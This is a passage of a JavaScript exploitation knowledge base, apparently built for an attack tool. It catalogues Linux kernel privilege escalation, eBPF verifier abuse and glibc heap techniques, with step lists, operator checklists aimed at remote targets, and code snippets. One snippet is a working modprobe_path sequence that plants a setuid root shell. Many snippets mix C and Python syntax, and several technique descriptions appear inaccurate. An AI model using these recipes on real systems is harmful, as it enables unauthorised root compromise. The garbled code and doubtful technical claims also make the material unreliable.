        description: 'Use BPF helper functions like bpf_map_update_elem with corrupted pointers from a verifier bypass to write to arbitrary kernel memory.',
        steps: [
          'Leak kernel base via OOB read (step 1 above)',
          'Identify target: modprobe_path (easiest), core_pattern, or current->cred->uid',
          'Use bpf_map_update_elem() with a map pointer that overlaps the target kernel address',
          'Write shell command path to modprobe_path → trigger execution of unknown binary → shell as root'
        ],
        tools: ['custom BPF exploit', 'pwntools'],
        codeSnippet: `// Overwrite modprobe_path via BPF write primitive:
uint64_t modprobe_path_addr = kernel_base + MODPROBE_PATH_OFFSET;
// Forge a BPF map pointer pointing to modprobe_path
// Call bpf_map_update_elem(forge_map, &key, new_value, flags)
// new_value = "/tmp/x.sh\\x00" → modprobe_path now points to our script`,
        references: [
          { description: 'modprobe_path overwrite technique', url: 'https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/' }
        ]
      },
      {
        name: 'Speculative Execution / Spectre-BPF',
        description: 'Use speculative execution in the BPF JIT to leak data that the verifier marked as inaccessible.',
        steps: [
          'This class of attack relies on CPU speculative execution, not logic bugs',
          'Requires BPF JIT enabled (check: /proc/sys/net/core/bpf_jit_enable)',
          'Very complex to exploit — typically requires deep kernel and CPU microarchitecture knowledge'
        ],
        tools: ['custom spectre gadgets', 'kernel exploit framworks'],
        references: [
          { description: 'Spectre v1/v2 via BPF', url: 'https://ebpf.io/static/2018-spectre-summit-krsti.pdf' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'BPF program loaded despite accessing OOB memory',
        'Kernel memory leaked (KASLR bypass achieved)',
        'modprobe_path overwritten with attacker-controlled path',
        'Root shell obtained via kernel write → userspace privilege escalation'
      ],
      artifacts: [
        'Loaded BPF program visible via bpftool prog show',
        'Modified modprobe_path = "/tmp/x" in kernel memory'
      ]
    },

    operatorChecklist: [
      '[ ] Check kernel version and cross-reference with known eBPF CVEs',
      '[ ] Check bpf_unprivileged setting: can you load BPF programs?',
      '[ ] If privileged: look for verifier bugs in newer kernels',
      '[ ] Study the vulnerable verifier code path in kernel source',
      '[ ] Craft BPF bytecode (use bpf_asm or write raw instructions)',
      '[ ] Test BPF program loading: verify verifier accepts the malicious program',
      '[ ] Implement OOB read to leak kernel pointers (KASLR bypass)',
      '[ ] Implement OOB write to overwrite modprobe_path or cred struct',
      '[ ] Trigger the overwritten path: execute unknown-binary-file → shell'
    ],

    vulnerabilityTypes: ['sandbox', 'kernel', 'ebpf'],
    references: [
      { description: 'ZB eBPF Verifier Bug Writeup (CVE-2020-8835)', url: 'https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification' },
      { description: 'Kernel Pwning with eBPF', url: 'https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story' },
      { description: 'Linux Kernel Exploitation - eBPF', url: 'https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/' }
    ]
  },

  kernel_privilege_escalation: {
    id: 'kernel_privilege_escalation',
    name: 'Kernel Privilege Escalation',
    category: 'technique',
    class: 'kernel',
    description: 'Exploits a vulnerability in the Linux kernel to elevate privileges from an unprivileged user to root. Common targets include heap overflows in kernel structures (SLUB allocator), race conditions, and logic bugs in syscall handlers.',

    preconditions: {
      summary: 'A kernel vulnerability (CVE) exists on the target system that allows memory corruption or logic bypass in kernel space.',
      required: [
        'Identified kernel vulnerability with a known exploitation technique',
        'Ability to interact with the vulnerable kernel interface (syscalls, ioctls, netlink, procfs, etc.)',
        'KASLR bypass technique (unless kernel addresses are somehow known)',
        'SMEP/SMAP bypass technique (unless disabled — check /proc/cpuinfo for smep/smap)',
        'Ability to run user-space code on the target machine'
      ],
      detectionSteps: [
        'uname -r → note kernel version → cross-reference with exploit-db, CVE databases',
        'cat /proc/cpuinfo | grep -E "smep|smap" → protection status',
        'cat /proc/sys/kernel/kptr_restrict → 0 = kernel pointers visible, 1/2 = hidden',
        'cat /proc/sys/kernel/dmesg_restrict → 0 = dmesg accessible',
        'Run linux-exploit-suggester or similar enumeration tools'
      ]
    },

    exploitationPaths: [
      {
        name: 'cred Structure Overwrite',
        description: 'The most direct path: overwrite the cred structure (specifically uid/gid fields) in the current task_struct to become root.',
        steps: [
          'Obtain the address of your current task_struct (via kernel stack leak, kallsyms, or /proc/self/stat)',
          'Use a kernel R/W primitive (arbitrary write via heap overflow, UAF, etc.) to overwrite cred->uid, cred->gid, cred->euid, cred->egid to 0',
          'Call setuid(0) or simply execve("/bin/sh") → shell spawns with root privileges'
        ],
        tools: ['kernel exploit (C)', 'pwntools (userspace orchestration)'],
        codeSnippet: `// Kernel exploit: commit_creds(prepare_kernel_cred(0))
void get_root(void) {
    commit_creds(prepare_kernel_cred(0));
}

// Or: manually zero out cred struct fields
// task_struct->cred->uid = 0;
// task_struct->cred->gid = 0;`
      },
      {
        name: 'modprobe_path Overwrite → Userspace Shell',
        description: 'Overwrite the kernel\'s modprobe_path string to point to an attacker-controlled script that will be executed as root.',
        steps: [
          'Use arbitrary kernel write to overwrite modprobe_path (located in kernel data section) with "/tmp/x" (a path you control)',
          'Create /tmp/x: a shell script that copies /bin/sh to /tmp/shell and chmod +s it (or starts a reverse shell)',
          'chmod +x /tmp/x',
          'Trigger modprobe by executing a file with an unknown binary format (e.g., a file with magic bytes \\xff\\xff\\xff\\xff)',
          'Kernel calls /tmp/x as root → /tmp/x runs → root shell planted'
        ],
        tools: ['kernel exploit (C)', 'pwntools'],
        codeSnippet: `// User-space part after modprobe_path overwrite:
echo '#!/bin/sh
cp /bin/sh /tmp/sh && chmod 4777 /tmp/sh' > /tmp/x
chmod +x /tmp/x
echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy
chmod +x /tmp/dummy
/tmp/dummy  # triggers modprobe_path = "/tmp/x" as root
/tmp/sh     # root shell!`,
        references: [
          { description: 'modprobe_path technique', url: 'https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/' }
        ]
      },
      {
        name: 'ret2usr (SMEP Disabled)',
        description: 'Redirect kernel execution to a user-space function that calls commit_creds(prepare_kernel_cred(0)).',
        steps: [
          'Overwrite a kernel function pointer with the address of a user-space shellcode function',
          'User-space function: call commit_creds(prepare_kernel_cred(0)) → return to user space → execve("/bin/sh")',
          'SMEP must be disabled (or bypassed via ROP to flip CR4.SMEP bit first)',
          'In newer kernels, SMEP is almost always on → requires a ROP chain to disable first if no SMAP bypass'
        ],
        tools: ['kernel exploit (C)', 'pwntools'],
        references: [
          { description: 'ret2usr technique', url: 'https://ctf101.org/kernel-exploitation/ret2usr/' }
        ]
      },
      {
        name: 'Kernel ROP Chain (SMEP/SMAP Enabled)',
        description: 'Build a kernel-space ROP chain using found gadgets to call commit_creds(prepare_kernel_cred(0)).',
        steps: [
          'Leak kernel base address via /proc/kallsyms (if readable) or kernel info leak',
          'Find kernel gadgets with ROPgadget on the kernel image (vmlinux)',
          'Build ROP chain: pop rdi; ret → prepare_kernel_cred_addr → pop rdi; ret → commit_creds_addr → return_to_user',
          'Stack pivot to a controlled kernel region (modprobe_path overwrite or heap spray)',
          'Trigger kernel vulnerability to execute the ROP chain'
        ],
        tools: ['ROPgadget (on vmlinux)', 'pwntools'],
        references: [
          { description: 'Kernel ROP exploitation', url: 'https://ctf101.org/kernel-exploitation/kernel-rop/' }
        ]
      }
    ],

    postconditions: {
      successIndicators: [
        'uid=0 in /bin/sh (or effective root privileges)',
        'commit_creds(prepare_kernel_cred(0)) executed in kernel context',
        'modprobe_path overwritten, suid binary planted'
      ],
      artifacts: [
        'dmesg showing kernel crash/cleanup if the exploit is unstable',
        'Root shell session',
        'Planted /tmp/sh with suid bit set'
      ]
    },

    operatorChecklist: [
      '[ ] Enumerate kernel version: uname -r → find applicable CVEs',
      '[ ] Check SMEP/SMAP/KPTI/KASLR status from /proc/cpuinfo and kernel config',
      '[ ] Check kptr_restrict for kernel address leak viability',
      '[ ] Find a kernel info leak (if KASLR enabled) — often via /proc/kallsyms, dmesg, or /sys interfaces',
      '[ ] Identify write primitive target: cred struct, modprobe_path, or function pointer',
      '[ ] If SMEP on: must use kernel ROP (cannot ret2usr directly)',
      '[ ] Build kernel ROP chain or prepare user-space shellcode function',
      '[ ] Develop the trigger for the kernel vulnerability (syscall, ioctl, race)',
      '[ ] Test locally in QEMU with matching kernel version before targeting remote'
    ],

    vulnerabilityTypes: ['sandbox', 'kernel'],
    references: [
      { description: 'Linux Kernel Exploitation (LKMPG)', url: 'https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/' },
      { description: 'Kernel PWN CTF 101', url: 'https://ctf101.org/kernel-exploitation/overview/' },
      { description: 'Kernel Exploitation Techniques', url: 'https://github.com/xairy/kernel-exploits' }
    ]
  },

  unsafe_unlink: {
    id: 'unsafe_unlink',
    name: 'Unsafe Unlink',
    category: 'technique',
    class: 'unlink',
    description: 'Exploits free() on a corrupted chunk in the unsorted bin to achieve arbitrary write. By forging fd and bk pointers of a freed chunk, the allocator unlink operation writes a heap pointer to an arbitrary memory location.',

    preconditions: {
      summary: 'A heap overflow or UAF that allows corrupting the fd/bk pointers of a chunk that will be placed in the unsorted bin.',
      required: [
        'Heap overflow or UAF on a chunk >= 0x80 bytes (unsorted bin range)',
        'Ability to corrupt fd and bk pointers of the freed chunk',
        'Target address must be writable (the unlink write: bk->fd = fd)',
        'The corrupted chunk must be freed and end up in the unsorted bin'
      ],
      detectionSteps: [
        'In GDB: set breakpoint on free and inspect chunk being freed',
        'Use pwndbg bins command to verify chunk enters unsorted bin',
        'Corrupt fd = target_addr - 0x18, bk = target_addr - 0x10',
        'Trigger free to see corrupted double-linked list error indicates successful unlink attempt'
      ]
    },

    exploitationPaths: [
      {
        name: 'Arbitrary Write via Unsorted Bin Unlink',
        description: 'Forge fd/bk of a freed chunk so that the allocator unlink writes a heap pointer to an arbitrary address.',
        steps: [
          'Allocate chunk A (>= 0x80 bytes) and chunk B (guard chunk)',
          'Overflow chunk A to corrupt the fd/bk pointers of chunk B (or forge them in A if A is freed)',
          'Set fd = target_addr - 0x18, bk = target_addr - 0x10',
          'Free chunk B which enters unsorted bin',
          'Trigger consolidation or next malloc: unlink runs chunk->bk->fd = chunk->fd',
          'Result: target_addr receives a heap pointer (the fd value)',
          'This is a write-what-where where what is a heap address'
        ],
        tools: ['pwndbg bins', 'pwntools', 'GDB'],
        codeSnippet: `# Forge chunk fd/bk for unlink
# target: arbitrary writable address
fd = target_addr - 0x18
bk = target_addr - 0x10

# Write forged pointers into the chunk
*(uint64_t*)(chunk + 0x10) = fd  # fd field
*(uint64_t*)(chunk + 0x18) = bk  # bk field

# Free the chunk enters unsorted bin
free(chunk)

# Trigger unlink: malloc or consolidation
malloc(0x50)
# Now: *(target_addr) = heap_pointer (fd value)`,
        applicableLibc: 'All versions (classic technique)',
        references: [
          { description: 'How2Heap: unsafe_unlink', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/unsafe_unlink.c' },
          { description: 'HITCON 2014 stkof writeup', url: 'http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Arbitrary address overwritten with a heap pointer', 'Can be chained with GOT overwrite or hook corruption'],
      artifacts: ['GDB: corrupted chunk fd/bk visible in unsorted bin']
    },

    operatorChecklist: [
      '[ ] Identify heap overflow or UAF on unsorted-bin-sized chunk',
      '[ ] Find a writable target address (GOT entry, global variable, etc.)',
      '[ ] Forge fd = target - 0x18, bk = target - 0x10 in the chunk',
      '[ ] Free the chunk into unsorted bin',
      '[ ] Trigger unlink via malloc or consolidation',
      '[ ] Verify target address now contains a heap pointer',
      '[ ] Chain with second-stage technique (GOT overwrite, FSOP, etc.)'
    ],

    vulnerabilityTypes: ['heap', 'unlink'],
    references: [
      { description: 'How2Heap: unsafe_unlink', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/unsafe_unlink.c' },
      { description: 'HITCON 2014: stkof', url: 'http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/' },
      { description: 'Insomnihack 2017: Wheel of Robots', url: 'https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a' }
    ]
  },

  overlapping_chunks: {
    id: 'overlapping_chunks',
    name: 'Overlapping Chunks',
    category: 'technique',
    class: 'heap-technique',
    description: 'Corrupts the size field of a freed or in-use chunk to cause a subsequent allocation to overlap with an existing chunk. Creates an overlapping allocation primitive that enables arbitrary read/write through two pointers to the same memory.',

    preconditions: {
      summary: 'A heap overflow that can overwrite the size field of an adjacent chunk (freed or in-use), causing the allocator to return overlapping memory.',
      required: [
        'Heap overflow reaching the next chunk size field',
        'Ability to set the size to a value that includes both chunks',
        'The corrupted chunk must be freed (for freed chunk variant) or the overflow must reach an in-use chunk size (for in-use variant)',
        'Glibc < 2.29 for the classic technique (patched in 2.29+ with additional size checks)'
      ],
      detectionSteps: [
        'In GDB: use vis_heap_chunks to visualize chunk layout',
        'Overflow into next chunk size field and set it to a large value',
        'Free the chunk and observe it enters unsorted bin with corrupted size',
        'Next malloc returns a chunk that overlaps with the following allocation'
      ]
    },

    exploitationPaths: [
      {
        name: 'Freed Chunk Size Corruption to Overlapping Allocation',
        description: 'Overwrite the size of a freed chunk in the unsorted bin to make the next allocation overlap with an existing chunk.',
        steps: [
          'Allocate chunks A, B, C (C is a guard chunk)',
          'Free B which enters unsorted bin',
          'Overflow A to corrupt B size field and set it to include C space',
          'Allocate a new chunk of the corrupted size which returns B+C combined',
          'Now the new allocation overlaps with C giving two pointers to overlapping memory',
          'Use the overlap to read/write controlled data through one pointer while the other pointer operates on it'
        ],
        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        codeSnippet: `a = malloc(0x80)
b = malloc(0x80)
c = malloc(0x80)  # guard chunk

free(b)  # b goes to unsorted bin

# Overflow a into b size field
*(uint64_t*)(a + 0x80) = 0x110  # b size now includes c

# Allocate overlapping chunk
d = malloc(0x100)  # d overlaps with c!
# Now d and c point to overlapping memory`,
        applicableLibc: '< 2.29',
        references: [
          { description: 'How2Heap: overlapping_chunks', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/overlapping_chunks.c' }
        ]
      },
      {
        name: 'In-Use Chunk Size Corruption to Overlapping Allocation',
        description: 'Overwrite the size of an in-use chunk to cause the next allocation to overlap.',
        steps: [
          'Allocate chunks A, B (B is in-use)',
          'Overflow A to corrupt B size field and set to a large value',
          'Free B and allocator uses the corrupted size for bin placement',
          'Next malloc returns a chunk overlapping with the following allocation'
        ],
        tools: ['pwndbg vis_heap_chunks', 'pwntools'],
        applicableLibc: '< 2.29',
        references: [
          { description: 'How2Heap: overlapping_chunks_2', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.23/overlapping_chunks_2.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['Two heap pointers reference overlapping memory regions', 'Arbitrary read/write achieved through the overlap'],
      artifacts: ['GDB: vis_heap_chunks shows overlapping chunk boundaries']
    },

    operatorChecklist: [
      '[ ] Identify heap overflow reaching next chunk size field',
      '[ ] Determine glibc version (< 2.29 for classic technique)',
      '[ ] Set up chunks: target chunk + guard chunk',
      '[ ] Corrupt size field to include the guard chunk',
      '[ ] Free the corrupted chunk',
      '[ ] Allocate to get overlapping region',
      '[ ] Use overlap for arbitrary read/write or metadata corruption'
    ],

    vulnerabilityTypes: ['heap', 'overflow'],
    references: [
      { description: 'How2Heap: overlapping_chunks', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/overlapping_chunks.c' },
      { description: 'How2Heap: overlapping_chunks_2', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.23/overlapping_chunks_2.c' },
      { description: 'hack.lu CTF 2015: bookstore', url: 'https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore' }
    ]
  },

  unsorted_bin_into_stack: {
    id: 'unsorted_bin_into_stack',
    name: 'Unsorted Bin into Stack',
    category: 'technique',
    class: 'heap-technique',
    description: 'Exploits an overwrite of a freed chunk bk pointer in the unsorted bin to make malloc return a nearly-arbitrary pointer. By corrupting the unsorted bin linked list, the allocator returns a pointer to an attacker-controlled address (typically on the stack).',

    preconditions: {
      summary: 'A heap overflow or UAF that allows corrupting the bk pointer of a chunk in the unsorted bin.',
      required: [
        'Heap overflow or UAF on a chunk that will be freed into the unsorted bin',
        'Ability to corrupt the bk pointer of the freed chunk',
        'Target address must have a valid fd pointer at offset 0 (for the forward check)',
        'Glibc < 2.29 (patched with additional integrity checks)'
      ],
      detectionSteps: [
        'Free a chunk and verify it enters the unsorted bin via pwndbg bins',
        'Corrupt the bk pointer of the unsorted bin chunk to point to target - 0x10',
        'Ensure target address has a valid fd pointer (for the unlink check: fd->bk == chunk)',
        'Trigger malloc: allocator follows corrupted bk and returns pointer near target'
      ]
    },

    exploitationPaths: [
      {
        name: 'Unsorted Bin bk Corruption to Arbitrary Allocation',
        description: 'Corrupt the bk pointer of an unsorted bin chunk to redirect the allocator allocation to a target address.',
        steps: [
          'Allocate chunk A (>= 0x80 bytes) and free it which enters unsorted bin',
          'Overflow into A bk pointer (at offset 0x18 from chunk start)',
          'Set bk = target_addr - 0x10 (where target is where you want malloc to return)',
          'Ensure target_addr - 0x10 has a valid fd pointer pointing back to the unsorted bin head (for the integrity check)',
          'Call malloc(size): allocator traverses unsorted bin, follows corrupted bk, returns chunk at target_addr',
          'Now you have an allocation at an arbitrary address'
        ],
        tools: ['pwndbg bins', 'pwntools', 'GDB'],
        codeSnippet: `# Free chunk into unsorted bin
a = malloc(0x80)
free(a)  # a goes to unsorted bin

# Corrupt bk pointer
# bk is at offset 0x18 from chunk start
*(uint64_t*)(a + 0x18) = target_addr - 0x10

# Ensure target has valid fd for integrity check
*(uint64_t*)(target_addr - 0x10) = &unsorted_bin_head

# Trigger allocation
b = malloc(0x80)  # b points to target_addr!`,
        applicableLibc: '< 2.29',
        references: [
          { description: 'How2Heap: unsorted_bin_into_stack', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/unsorted_bin_into_stack.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns pointer at attacker-controlled address', 'Arbitrary allocation primitive achieved'],
      artifacts: ['GDB: unsorted bin with corrupted bk chain']
    },

    operatorChecklist: [
      '[ ] Free chunk into unsorted bin',
      '[ ] Corrupt bk pointer via heap overflow or UAF',
      '[ ] Set bk = target - 0x10',
      '[ ] Ensure target has valid fd pointer for integrity check',
      '[ ] Trigger malloc to get allocation at target',
      '[ ] Note: patched in glibc 2.29+'
    ],

    vulnerabilityTypes: ['heap', 'unsorted-bin'],
    references: [
      { description: 'How2Heap: unsorted_bin_into_stack', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.27/unsorted_bin_into_stack.c' }
    ]
  },

  house_of_water: {
    id: 'house_of_water',
    name: 'House of Water',
    category: 'technique',
    class: 'house',
    description: 'A leakless heap exploitation technique that uses a UAF or double-free to gain control of the tcache metadata structure. By manipulating the tcache_perthread_struct, an attacker can link arbitrary addresses into the tcache without any libc or heap leaks.',

    preconditions: {
      summary: 'A UAF or double-free vulnerability on a tcache chunk that allows overwriting the tcache metadata structure.',
      required: [
        'UAF or double-free on a tcache-sized chunk',
        'Ability to write to the tcache_perthread_struct (located in the heap)',
        'No leaks required: this is a fully leakless technique',
        'Glibc >= 2.26 (tcache era)'
      ],
      detectionSteps: [
        'Identify tcache_perthread_struct location: heap_base + 0x10 (after main arena)',
        'The struct contains: counts[64] (bytes) + entries[64] (pointers)',
        'Use UAF to overwrite entries[N] with target address',
        'Set counts[N] > 0 to mark the bin as having entries'
      ]
    },

    exploitationPaths: [
      {
        name: 'Leakless Tcache Metadata Control to Arbitrary Allocation',
        description: 'Corrupt the tcache metadata to insert arbitrary addresses into the tcache without any leaks.',
        steps: [
          'Find the tcache_perthread_struct on the heap (typically at heap_base + 0x10)',
          'Use UAF or double-free to overwrite an entry in the tcache entries array',
          'Set entries[size_index] = target_address (the address you want malloc to return)',
          'Set counts[size_index] = 1 (mark the bin as non-empty)',
          'Call malloc(size): returns target_address directly from the corrupted tcache',
          'No leaks needed: the tcache metadata is at a predictable offset from the heap base'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Find tcache_perthread_struct
# Located at heap_base + 0x10
# Structure: counts[64] (64 bytes) + entries[64] (512 bytes)

# Overwrite tcache metadata via UAF
tcache_struct = heap_base + 0x10
size_index = 0x60 >> 4  # index for 0x60 size

# Set entries[size_index] = target
*(uint64_t*)(tcache_struct + 0x40 + size_index * 8) = target_addr

# Set counts[size_index] = 1
*(uint8_t*)(tcache_struct + size_index) = 1

# malloc returns target_addr
p = malloc(0x60)  # p == target_addr!`,
        applicableLibc: '>= 2.26',
        references: [
          { description: 'How2Heap: house_of_water', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c' },
          { description: '37C3 Potluck CTF: Tamagoyaki', url: 'https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns attacker-controlled address without any leaks', 'Arbitrary allocation achieved leaklessly'],
      artifacts: ['Corrupted tcache_perthread_struct on the heap']
    },

    operatorChecklist: [
      '[ ] Identify UAF or double-free on tcache chunk',
      '[ ] Locate tcache_perthread_struct (heap_base + 0x10)',
      '[ ] Calculate size_index = target_size >> 4',
      '[ ] Overwrite entries[size_index] = target_address',
      '[ ] Set counts[size_index] = 1',
      '[ ] malloc(target_size) returns target_address',
      '[ ] Chain with second-stage technique for code execution'
    ],

    vulnerabilityTypes: ['heap', 'tcache', 'uaf'],
    references: [
      { description: 'How2Heap: house_of_water', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c' },
      { description: '37C3 Potluck: Tamagoyaki writeup', url: 'https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki' }
    ]
  },

  house_of_tangerine: {
    id: 'house_of_tangerine',
    name: 'House of Tangerine',
    category: 'technique',
    class: 'house',
    description: 'A modern (glibc >= 2.26) technique that exploits the top chunk (wilderness) to trick malloc into returning a completely arbitrary pointer by abusing the tcache freelist. It combines top chunk corruption with tcache poisoning to achieve arbitrary allocation without the limitations of House of Orange.',

    preconditions: {
      summary: 'An overflow into the top chunk size field combined with the ability to trigger sysmalloc and tcache operations.',
      required: [
        'Heap overflow reaching the top chunk size field',
        'Ability to trigger a large malloc that invokes sysmalloc',
        'Glibc >= 2.26 (tcache era)',
        'No free() call strictly required (similar to House of Orange but uses tcache)'
      ],
      detectionSteps: [
        'Overflow into top chunk size and set to a value that triggers sysmalloc',
        'Trigger large malloc: sysmalloc frees old top chunk',
        'The freed top chunk enters the tcache (if size <= 0x408)',
        'Corrupt the tcache entry to point to arbitrary address'
      ]
    },

    exploitationPaths: [
      {
        name: 'Top Chunk + Tcache to Arbitrary Pointer',
        description: 'Corrupt top chunk to trigger sysmalloc, then abuse tcache to get arbitrary allocation.',
        steps: [
          'Overflow into top chunk size field and set to a small value that triggers sysmalloc',
          'Call malloc(large_size): sysmalloc is invoked',
          'sysmalloc frees the old top chunk: it enters the tcache (if size is in tcache range)',
          'Use UAF or overflow to corrupt the tcache fd pointer of the freed top chunk',
          'Set fd = target_address',
          'malloc(same_size) returns target_address from the corrupted tcache'
        ],
        tools: ['pwndbg heap', 'pwntools'],
        codeSnippet: `# Overflow into top chunk
# Set top chunk size to trigger sysmalloc
*(uint64_t*)(top_chunk + 0x8) = 0x21  # small size

# Trigger sysmalloc
malloc(0x1000)  # old top chunk freed, enters tcache

# Corrupt tcache fd pointer
# The freed top chunk is now in tcache
*(uint64_t*)(freed_top_chunk) = target_addr

# Get arbitrary allocation
p = malloc(0x10)  # p == target_addr!`,
        applicableLibc: '>= 2.26',
        references: [
          { description: 'How2Heap: house_of_tangerine', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c' },
          { description: 'PicoCTF 2024: High Frequency Troubles', url: 'https://play.picoctf.org/practice/challenge/441' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns arbitrary address via tcache poisoning', 'No free() call required'],
      artifacts: ['Corrupted top chunk and tcache entry']
    },

    operatorChecklist: [
      '[ ] Overflow into top chunk size field',
      '[ ] Set size to trigger sysmalloc',
      '[ ] Trigger large malloc to invoke sysmalloc',
      '[ ] Old top chunk freed into tcache',
      '[ ] Corrupt tcache fd pointer to target address',
      '[ ] malloc returns target address',
      '[ ] Chain with second-stage technique'
    ],

    vulnerabilityTypes: ['heap', 'top-chunk', 'tcache'],
    references: [
      { description: 'How2Heap: house_of_tangerine', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_tangerine.c' },
      { description: 'PicoCTF 2024: High Frequency Troubles', url: 'https://play.picoctf.org/practice/challenge/441' }
    ]
  },

  tcache_house_of_spirit: {
    id: 'tcache_house_of_spirit',
    name: 'Tcache House of Spirit',
    category: 'technique',
    class: 'house',
    description: 'The tcache-era version of House of Spirit. Frees a fake chunk (on stack, BSS, or any writable region) to get malloc to return a nearly-arbitrary pointer via the tcache freelist. Simpler than the classic version since tcache has fewer integrity checks.',

    preconditions: {
      summary: 'Ability to call free() on an arbitrary address where a fake chunk can be forged.',
      required: [
        'Ability to call free() on an attacker-controlled address',
        'Writable memory region at the target address (stack, BSS, heap, etc.)',
        'Must forge a valid chunk header (size field at offset 0x8)',
        'Glibc >= 2.26 (tcache era)'
      ],
      detectionSteps: [
        'Forge a fake chunk at target address: set size field to valid tcache size (0x20-0x410)',
        'Set the next chunk size field (at fake_chunk + size) to a valid value',
        'Call free(fake_chunk) which enters tcache',
        'malloc(same_size) returns fake_chunk pointer'
      ]
    },

    exploitationPaths: [
      {
        name: 'Fake Chunk on Stack to Stack Allocation via Tcache',
        description: 'Forge a fake chunk on the stack and free it to get malloc to return stack memory.',
        steps: [
          'Identify a writable region (stack, BSS, etc.) where you can forge a chunk',
          'Forge chunk header: size = 0x31 (0x20 data + 0x10 header, PREV_INUSE set)',
          'Forge next chunk header: size = 0x21 (valid size for the region)',
          'Call free(fake_chunk_address): chunk enters tcache',
          'malloc(0x20) returns fake_chunk_address',
          'Now you can write to the stack/BSS via malloc pointer'
        ],
        tools: ['pwndbg heap', 'pwntools', 'GDB'],
        codeSnippet: `# Forge fake chunk on stack
char buf[0x40];
uint64_t *fake_chunk = (uint64_t*)buf;

// Set size field (offset 0x8 from malloc pointer)
// We want malloc to return buf, so fake_chunk = buf - 0x10
fake_chunk[0] = 0;           // prev_size (unused)
fake_chunk[1] = 0x31;        // size: 0x20 data + PREV_INUSE
fake_chunk[2] = 0x21;        // next chunk size

// Free the fake chunk
free((void*)fake_chunk);     // enters tcache

// Get allocation at fake chunk
void *p = malloc(0x20);      // p == &buf!`,
        applicableLibc: '>= 2.26',
        references: [
          { description: 'How2Heap: tcache_house_of_spirit', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_house_of_spirit.c' }
        ]
      }
    ],

    postconditions: {
      successIndicators: ['malloc returns pointer in stack/BSS region', 'Arbitrary allocation at attacker-controlled address'],
      artifacts: ['Fake chunk in tcache freelist']
    },

    operatorChecklist: [
      '[ ] Choose target region (stack, BSS, etc.)',
      '[ ] Forge chunk header with valid size',
      '[ ] Forge next chunk header with valid size',
      '[ ] Call free() on fake chunk address',
      '[ ] Verify chunk enters tcache via pwndbg bins',
      '[ ] malloc returns fake chunk address',
      '[ ] Write to the target region via malloc pointer'
    ],

    vulnerabilityTypes: ['heap', 'house'],
    references: [
      { description: 'How2Heap: tcache_house_of_spirit', url: 'https://github.com/shellphish/how2heap/blob/master/glibc_2.35/tcache_house_of_spirit.c' }
    ]
  },

  fastbin_reverse_into_tcache: {
    id: 'fastbin_reverse_into_tcache',
    name: 'Fastbin Reverse into Tcache',
    category: 'technique',
    class: 'heap-technique',
    description: 'Exploits an overwrite of a freed chunk in the fastbin to write a large value (heap pointer) to an arbitrary address. When a fastbin chunk is freed while tcache is full, it goes to the fastbin. The allocator consolidation process then writes the fastbin head to an arbitrary address via the corrupted bk pointer.',

    preconditions: {
      summary: 'A heap overflow or UAF that allows corrupting a fastbin chunk metadata, combined with a full tcache to force the chunk into the fastbin.',
      required: [
        'Heap overflow or UAF on a fastbin-sized chunk',
        'Tcache must be full (7 entries) for the target size to force fastbin usage',
        'Ability to corrupt the fastbin chunk fd/bk pointers',
        'Glibc 2.26-2.42 (patched in 2.43+)'
      ],
      detectionSteps: [
        'Fill tcache for the target size (7 frees)',
        'Free another chunk which goes to fastbin',
        'Corrupt the fastbin chunk metadata',
        'Trigger consolidation or malloc: arbitrary write occurs'
      ]
    },

    exploitationPaths: [
      {
        name: 'Fastbin Corruption to Arbitrary Write via Tcache',
        description: 'Corrupt a fastbin chunk to write a heap pointer to an arbitrary address during tcache population.',
        steps: [
          'Fill tcache for size X (7 chunks freed)',
          'Allocate and free chunk A (size X): goes to fastbin',
          'Overflow into A metadata to corrupt pointers',
          'Trigger malloc_consolidate or a large malloc: fastbin chunks move to unsorted bin',
          'During the move, the corrupted pointers cause an arbitrary write',
          'Result: arbitrary address receives a heap pointer'
        ],
        tools: ['pwndbg bins', 'pwntools'],
        codeSnippet: `# Fill tcache
for i in range(7):
    p = malloc(0x60)
    free(p)

# Fastbin chunk
a = malloc(0x60)
free(a)  # a goes to fastbin (tcache full)

# Corrupt fastbin chunk
*(uint64_t*)(a + 0x18) = target_addr - 0x10  # bk pointer

# Trigger consolidation
malloc(0x400)  # large malloc triggers consolidate
# target_addr now contains heap pointer`,
        applicableLibc: '2.26-2.42',
        references: [
